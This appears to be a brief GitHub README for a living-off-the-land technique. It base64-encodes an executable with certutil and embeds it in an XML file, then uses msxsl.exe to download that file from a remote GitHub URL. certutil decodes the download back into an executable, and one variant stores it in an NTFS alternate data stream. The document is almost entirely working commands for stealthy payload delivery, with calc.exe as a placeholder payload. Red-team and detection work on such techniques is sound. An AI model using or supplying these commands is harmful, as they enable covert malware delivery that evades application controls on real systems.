# Use-msxsl-to-download-file

## Prepare payload XML file
```
certutil -encode C:\Windows\System32\calc.exe calc_payload.txt
```

Now copy the certutil encoded payload from calc_payload.txt and insert into calc_xsl.xml between `<TEST> </TEST>`


### Use MSXSL to download XML with certutil encoded payload
```
msxsl.exe "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc_xsl.xml " "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/xsl.xml" -o <filename>

certutil -decode <filename> calc.exe
```

### Use MSXSL to download XML with certutil encoded payload and save to ADS:
```
msxsl.exe "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc_xsl.xml" "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/xsl.xml" -o <filename>:<ADS name>

certutil -decode <filename>:<ADS name> calc.exe
```
